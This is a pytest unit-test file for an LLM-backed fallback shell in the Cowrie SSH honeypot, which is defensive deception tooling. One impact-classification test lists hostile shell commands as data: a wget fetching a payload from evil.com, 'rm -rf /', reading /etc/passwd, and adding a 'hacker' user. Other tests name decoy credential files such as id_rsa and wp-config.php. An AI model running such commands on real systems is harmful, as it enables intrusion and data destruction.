"""
Unit tests for Cowrie.shell.llm_fallback

Tests LLMFallbackHandler (build_prompt, _classify_impact, _detect_installs,
_find_credential_paths), SessionStateRegister, and strip_markdown.

All twisted/cowrie dependencies are mocked so tests run without twisted installed.
"""

import importlib.util
import json
import signal
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Bootstrap: mock twisted and cowrie dependencies, then load modules
# ---------------------------------------------------------------------------

# Create mock modules for twisted
_twisted_mock = MagicMock()
_twisted_internet_mock = MagicMock()
_twisted_python_mock = MagicMock()

sys.modules.setdefault("twisted", _twisted_mock)
sys.modules.setdefault("twisted.internet", _twisted_internet_mock)
sys.modules.setdefault("twisted.internet.defer", MagicMock())
sys.modules.setdefault("twisted.python", _twisted_python_mock)
sys.modules.setdefault("twisted.python.log", MagicMock())
sys.modules.setdefault("twisted.internet.reactor", MagicMock())
sys.modules.setdefault("twisted.web", MagicMock())
sys.modules.setdefault("twisted.web.client", MagicMock())
sys.modules.setdefault("twisted.web.http_headers", MagicMock())

# Create mock for cowrie.core.config with a configurable CowrieConfig
_mock_cowrie_config = MagicMock()
_mock_cowrie_config.get.return_value = ""
_mock_cowrie_config.getint.return_value = 50
_mock_cowrie_config.getfloat.return_value = 0.3
_mock_cowrie_config.getboolean.return_value = False

_cowrie_core_config_mod = MagicMock()
_cowrie_core_config_mod.CowrieConfig = _mock_cowrie_config

sys.modules.setdefault("cowrie", MagicMock())
sys.modules.setdefault("cowrie.core", MagicMock())
sys.modules.setdefault("cowrie.core.config", _cowrie_core_config_mod)

# Mock cowrie.llm.llm with minimal LLMClient and StringProducer
_cowrie_llm_mod = MagicMock()
_cowrie_llm_mod.LLMClient = MagicMock
_cowrie_llm_mod.StringProducer = MagicMock
_cowrie_llm_mod.QuietHTTP11ClientFactory = MagicMock
sys.modules.setdefault("cowrie.llm", MagicMock())
sys.modules.setdefault("cowrie.llm.llm", _cowrie_llm_mod)

# Load prequery module (pure Python, no twisted deps)
_prequery_path = (
    Path(__file__).resolve().parent.parent
    / "Cowrie" / "cowrie-src" / "src" / "cowrie" / "shell" / "prequery.py"
)
_spec = importlib.util.spec_from_file_location("cowrie.shell.prequery", _prequery_path)
_prequery_mod = importlib.util.module_from_spec(_spec)
sys.modules["cowrie.shell.prequery"] = _prequery_mod
_spec.loader.exec_module(_prequery_mod)

# Ensure cowrie.shell exists in sys.modules so llm_fallback can import from it
sys.modules.setdefault("cowrie.shell", MagicMock())
sys.modules["cowrie.shell.prequery"] = _prequery_mod

# Load llm_fallback module
_fallback_path = (
    Path(__file__).resolve().parent.parent
    / "Cowrie" / "cowrie-src" / "src" / "cowrie" / "shell" / "llm_fallback.py"
)
_fb_spec = importlib.util.spec_from_file_location("cowrie.shell.llm_fallback", _fallback_path)
_fb_mod = importlib.util.module_from_spec(_fb_spec)
sys.modules["cowrie.shell.llm_fallback"] = _fb_mod
_fb_spec.loader.exec_module(_fb_mod)

from cowrie.shell.llm_fallback import (  # noqa: E402
    LLMFallbackHandler,
    SessionStateRegister,
    strip_markdown,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

PROFILES_DIR = Path(__file__).resolve().parent.parent / "Reconfigurator" / "profiles"


@pytest.fixture
def wordpress_profile():
    with open(PROFILES_DIR / "wordpress_server.json") as f:
        return json.load(f)


@pytest.fixture
def database_profile():
    with open(PROFILES_DIR / "database_server.json") as f:
        return json.load(f)


def _make_handler(profile=None, prompt_text="You are a test server."):
    """Create an LLMFallbackHandler with mocked config and protocol."""
    # Write profile and prompt to temp files if provided
    tmpdir = tempfile.mkdtemp()
    prompt_path = Path(tmpdir) / "prompt.txt"
    prompt_path.write_text(prompt_text)

    profile_path = ""
    if profile is not None:
        pf = Path(tmpdir) / "profile.json"
        pf.write_text(json.dumps(profile))
        profile_path = str(pf)

    def config_get(section, key, fallback=""):
        lookup = {
            ("hybrid_llm", "profile_file"): profile_path,
            ("hybrid_llm", "prompt_file"): str(prompt_path),
            ("hybrid_llm", "api_key"): "test-key",
            ("hybrid_llm", "model"): "test-model",
            ("hybrid_llm", "host"): "https://api.example.com",
            ("hybrid_llm", "path"): "/v1/chat/completions",
        }
        return lookup.get((section, key), fallback)

    def config_getint(section, key, fallback=0):
        lookup = {
            ("hybrid_llm", "state_register_size"): 50,
            ("hybrid_llm", "max_history"): 20,
            ("hybrid_llm", "max_tokens"): 500,
        }
        return lookup.get((section, key), fallback)

    def config_getfloat(section, key, fallback=0.0):
        return 0.3

    def config_getboolean(section, key, fallback=False):
        return False

    _mock_cowrie_config.get.side_effect = config_get
    _mock_cowrie_config.getint.side_effect = config_getint
    _mock_cowrie_config.getfloat.side_effect = config_getfloat
    _mock_cowrie_config.getboolean.side_effect = config_getboolean

    # Prevent LLMClient from being created (needs reactor)
    LLMFallbackHandler._llm_client = MagicMock()

    protocol = MagicMock()
    protocol.hostname = "wp-prod-01"
    protocol.fs = None

    handler = LLMFallbackHandler(protocol)
    return handler


# ---------------------------------------------------------------------------
# strip_markdown tests
# ---------------------------------------------------------------------------


class TestStripMarkdown:
    def test_removes_code_fences(self):
        text = "```bash\nls -la\n```"
        assert strip_markdown(text) == "ls -la"

    def test_removes_language_tag(self):
        text = "```python\nprint('hello')\n```"
        assert strip_markdown(text) == "print('hello')"

    def test_removes_backticks(self):
        assert strip_markdown("`foo`") == "foo"

    def test_preserves_plain_text(self):
        assert strip_markdown("normal output") == "normal output"

    def test_strips_whitespace(self):
        assert strip_markdown("  output  ") == "output"

    def test_empty_string(self):
        assert strip_markdown("") == ""

    def test_multiple_fences(self):
        text = "```\nline1\n```\n```\nline2\n```"
        result = strip_markdown(text)
        assert "line1" in result
        assert "line2" in result


# ---------------------------------------------------------------------------
# SessionStateRegister tests
# ---------------------------------------------------------------------------


class TestSessionStateRegister:
    def test_empty_register(self):
        reg = SessionStateRegister()
        assert reg.to_prompt_string() == "(no state changes yet)"
        assert len(reg.changes) == 0

    def test_add_change(self):
        reg = SessionStateRegister()
        reg.add_change("ls -la", "total 4\ndrwxr-xr-x ...", impact=0)
        assert len(reg.changes) == 1
        assert reg.changes[0]["command"] == "ls -la"
        assert reg.changes[0]["impact"] == 0

    def test_impact_clamping(self):
        reg = SessionStateRegister()
        reg.add_change("cmd", "out", impact=-5)
        assert reg.changes[0]["impact"] == 0
        reg.add_change("cmd2", "out", impact=99)
        assert reg.changes[1]["impact"] == 4

    def test_response_truncation(self):
        reg = SessionStateRegister()
        long_response = "x" * 500
        reg.add_change("cmd", long_response)
        assert len(reg.changes[0]["summary"]) == 200

    def test_pruning(self):
        reg = SessionStateRegister(max_entries=3)
        for i in range(5):
            reg.add_change(f"cmd{i}", f"out{i}", impact=i % 3)
        assert len(reg.changes) <= 3

    def test_pruning_keeps_high_impact(self):
        reg = SessionStateRegister(max_entries=2)
        reg.add_change("low1", "out", impact=0)
        reg.add_change("low2", "out", impact=0)
        reg.add_change("high", "out", impact=4)
        # After pruning, the high-impact entry must survive
        commands = [c["command"] for c in reg.changes]
        assert "high" in commands

    def test_to_prompt_string_format(self):
        reg = SessionStateRegister()
        reg.add_change("whoami", "root", impact=0)
        result = reg.to_prompt_string()
        assert "- [0] whoami: root" in result


# ---------------------------------------------------------------------------
# LLMFallbackHandler._classify_impact tests
# ---------------------------------------------------------------------------


class TestClassifyImpact:
    @pytest.fixture(autouse=True)
    def handler(self):
        self.h = _make_handler()

    @pytest.mark.parametrize("cmd,expected", [
        ("ls -la", 0),
        ("whoami", 0),
        ("uname -a", 0),
        ("cd /tmp", 1),
        ("export FOO=bar", 1),
        ("wget http://evil.com/payload", 2),
        ("apt install nginx", 2),
        ("rm file.txt", 2),
        ("touch /tmp/test", 2),
        ("chmod 777 /tmp/test", 3),
        ("useradd hacker", 3),
        ("sudo su", 3),
        ("cat /etc/passwd", 3),  # "passwd" substring triggers impact 3
        ("rm -rf /", 4),
        ("shutdown -h now", 4),
        ("reboot", 4),
    ])
    def test_impact_levels(self, cmd, expected):
        assert self.h._classify_impact(cmd) == expected


# ---------------------------------------------------------------------------
# LLMFallbackHandler._detect_installs tests
# ---------------------------------------------------------------------------


class TestDetectInstalls:
    @pytest.fixture(autouse=True)
    def handler(self):
        self.h = _make_handler()

    def test_apt_install(self):
        self.h._detect_installs("apt install nginx")
        assert "nginx" in self.h._installed_packages_overlay

    def test_apt_get_install(self):
        self.h._detect_installs("apt-get install htop vim")
        assert "htop" in self.h._installed_packages_overlay
        assert "vim" in self.h._installed_packages_overlay

    def test_sudo_apt_install(self):
        self.h._detect_installs("sudo apt install curl")
        assert "curl" in self.h._installed_packages_overlay

    def test_yum_install(self):
        self.h._detect_installs("yum install httpd")
        assert "httpd" in self.h._installed_packages_overlay

    def test_pip_install(self):
        self.h._detect_installs("pip install requests")
        assert "requests" in self.h._installed_packages_overlay

    def test_pip3_install(self):
        self.h._detect_installs("pip3 install flask")
        assert "flask" in self.h._installed_packages_overlay

    def test_snap_install(self):
        self.h._detect_installs("snap install docker")
        assert "docker" in self.h._installed_packages_overlay

    def test_flags_ignored(self):
        self.h._detect_installs("apt install -y nginx")
        assert "-y" not in self.h._installed_packages_overlay
        assert "nginx" in self.h._installed_packages_overlay

    def test_no_duplicates(self):
        self.h._detect_installs("apt install nginx")
        self.h._detect_installs("apt install nginx")
        assert self.h._installed_packages_overlay.count("nginx") == 1

    def test_non_install_command_ignored(self):
        self.h._detect_installs("ls -la")
        assert len(self.h._installed_packages_overlay) == 0


# ---------------------------------------------------------------------------
# LLMFallbackHandler._find_credential_paths tests
# ---------------------------------------------------------------------------


class TestFindCredentialPaths:
    def test_finds_env_file(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        assert "/var/www/html/.env" in h._credential_paths

    def test_finds_wp_config(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        assert "/var/www/html/wp-config.php" in h._credential_paths

    def test_finds_ssh_key(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        assert "/home/deploy/.ssh/id_rsa" in h._credential_paths

    def test_finds_password_in_content(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        # backup_db.sh contains MYSQL_PWD which matches credential keywords
        assert "/home/deploy/backup_db.sh" in h._credential_paths

    def test_empty_profile_no_creds(self):
        h = _make_handler(profile={})
        assert len(h._credential_paths) == 0


# ---------------------------------------------------------------------------
# LLMFallbackHandler.build_prompt tests
# ---------------------------------------------------------------------------


class TestBuildPrompt:
    def test_basic_structure(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("whoami")
        assert len(messages) >= 2
        assert messages[0]["role"] == "system"
        assert messages[-1]["role"] == "user"
        assert messages[-1]["content"] == "whoami"

    def test_system_prompt_loaded(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile, prompt_text="Test system prompt.")
        messages = h.build_prompt("ls")
        assert "Test system prompt." in messages[0]["content"]

    def test_dpkg_injects_packages(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("dpkg -l")
        system = messages[0]["content"]
        assert "INSTALLED PACKAGES" in system
        assert "apache2" in system
        assert "mysql-server" in system

    def test_systemctl_injects_services(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("systemctl status apache2")
        system = messages[0]["content"]
        assert "RUNNING SERVICES" in system
        assert "apache2" in system
        assert "PID" in system

    def test_mysql_injects_db_context(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("mysql -u root -p")
        system = messages[0]["content"]
        assert "DATABASE CONTEXT" in system
        assert "mysqld" in system

    def test_mysql_includes_credential_paths(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("mysql -u root -p")
        system = messages[0]["content"]
        assert "credential files" in system

    def test_cat_known_file_injects_path_context(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("cat /var/www/html/wp-config.php")
        system = messages[0]["content"]
        assert "PATH CONTEXT" in system
        assert "wp-config.php" in system

    def test_unknown_command_gets_directory_tree_fallback(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        messages = h.build_prompt("randomgarbage")
        system = messages[0]["content"]
        # Should fall back to full directory tree
        assert "FILESYSTEM (key directories):" in system

    def test_empty_profile_no_crash(self):
        h = _make_handler(profile={})
        messages = h.build_prompt("ls")
        assert len(messages) >= 2
        assert messages[-1]["content"] == "ls"

    def test_history_included(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.history = [
            {"role": "user", "content": "whoami"},
            {"role": "assistant", "content": "root"},
        ]
        messages = h.build_prompt("id")
        # system + history(2) + current = 4 messages
        assert len(messages) == 4
        assert messages[1]["content"] == "whoami"
        assert messages[2]["content"] == "root"
        assert messages[3]["content"] == "id"

    def test_state_register_included(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.state_register.add_change("whoami", "root", impact=0)
        messages = h.build_prompt("id")
        system = messages[0]["content"]
        assert "STATE REGISTER" in system
        assert "whoami" in system

    def test_package_overlay_in_prompt(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h._installed_packages_overlay = ["nginx"]
        messages = h.build_prompt("dpkg -l")
        system = messages[0]["content"]
        assert "nginx (newly installed)" in system

    def test_no_profile_fallback_prompt(self):
        """Without a profile, handler generates a basic fallback system prompt."""
        # Write no profile, no prompt file
        _mock_cowrie_config.get.side_effect = lambda s, k, fallback="": fallback
        _mock_cowrie_config.getint.side_effect = lambda s, k, fallback=0: fallback
        _mock_cowrie_config.getfloat.side_effect = lambda s, k, fallback=0.0: fallback
        _mock_cowrie_config.getboolean.side_effect = lambda s, k, fallback=False: fallback
        LLMFallbackHandler._llm_client = MagicMock()

        protocol = MagicMock()
        protocol.hostname = "testhost"
        protocol.fs = None
        h = LLMFallbackHandler(protocol)

        messages = h.build_prompt("uname")
        system = messages[0]["content"]
        assert "testhost" in system
        assert "SSH shell" in system


# ---------------------------------------------------------------------------
# Prequery logging / metrics tests
# ---------------------------------------------------------------------------


class TestPrequeryLogging:
    @pytest.fixture(autouse=True)
    def reset_log(self):
        # log is imported as: from twisted.python import log
        # so it's the .log attribute on the twisted.python mock
        self.mock_log = sys.modules["twisted.python"].log
        self.mock_log.msg.reset_mock()

    def _log_str(self):
        return " ".join(str(c) for c in self.mock_log.msg.call_args_list)

    def test_logs_context_keys_for_dpkg(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("dpkg -l")
        log_str = self._log_str()
        assert "prequery" in log_str
        assert "packages" in log_str

    def test_logs_context_keys_for_systemctl(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("systemctl status apache2")
        assert "services_detail" in self._log_str()

    def test_logs_paths_for_cat(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("cat /var/www/html/wp-config.php")
        assert "wp-config.php" in self._log_str()

    def test_logs_fallback_for_unknown_command(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("randomgarbage")
        assert "fallback" in self._log_str()

    def test_logs_context_length(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("dpkg -l")
        assert "context_len=" in self._log_str()

    def test_logs_multiple_context_keys(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h.build_prompt("dpkg -l | systemctl status apache2")
        log_str = self._log_str()
        assert "packages" in log_str or "services_detail" in log_str


# ---------------------------------------------------------------------------
# LLMFallbackHandler.reload_profile tests
# ---------------------------------------------------------------------------


class TestReloadProfile:
    def test_reload_clears_state(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h._installed_packages_overlay = ["nginx"]
        h._system_prompt = "cached prompt"

        h.reload_profile()

        assert h._installed_packages_overlay == []
        assert h._system_prompt is None
        # Profile should be reloaded (file still exists)
        assert len(h._profile) > 0


# ---------------------------------------------------------------------------
# Signal-based hot-reload tests
# ---------------------------------------------------------------------------


class TestSignalReload:
    def setup_method(self):
        # Reset class-level state between tests
        LLMFallbackHandler._reload_requested = False

    def test_request_reload_sets_flag(self):
        LLMFallbackHandler.request_reload()
        assert LLMFallbackHandler._reload_requested is True

    def test_build_prompt_clears_flag_and_reloads(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h._system_prompt = "old cached prompt"
        h._installed_packages_overlay = ["stale-pkg"]

        LLMFallbackHandler._reload_requested = True
        h.build_prompt("ls")

        # Flag should be cleared
        assert LLMFallbackHandler._reload_requested is False
        # Cached prompt and overlay should be cleared by reload
        assert h._system_prompt is not None  # re-loaded from file
        assert h._installed_packages_overlay == []

    def test_build_prompt_without_reload_preserves_state(self, wordpress_profile):
        h = _make_handler(profile=wordpress_profile)
        h._installed_packages_overlay = ["nginx"]

        LLMFallbackHandler._reload_requested = False
        h.build_prompt("ls")

        # Overlay should be preserved (no reload happened)
        assert "nginx" in h._installed_packages_overlay

    def test_sigusr1_handler_requests_reload(self):
        LLMFallbackHandler._reload_requested = False
        LLMFallbackHandler._handle_sigusr1(signal.SIGUSR1, None)
        assert LLMFallbackHandler._reload_requested is True

    def test_signal_registration(self):
        LLMFallbackHandler._signal_registered = False
        LLMFallbackHandler._register_signal_handler()
        assert LLMFallbackHandler._signal_registered is True

    def test_reload_flag_applies_once(self, wordpress_profile):
        """Reload flag is consumed by the first handler that checks it."""
        h1 = _make_handler(profile=wordpress_profile)
        h2 = _make_handler(profile=wordpress_profile)

        LLMFallbackHandler._reload_requested = True

        # First handler consumes the flag
        h1.build_prompt("ls")
        assert LLMFallbackHandler._reload_requested is False

        # Second handler does NOT reload (flag already cleared)
        h2._installed_packages_overlay = ["should-survive"]
        h2.build_prompt("ls")
        assert "should-survive" in h2._installed_packages_overlay
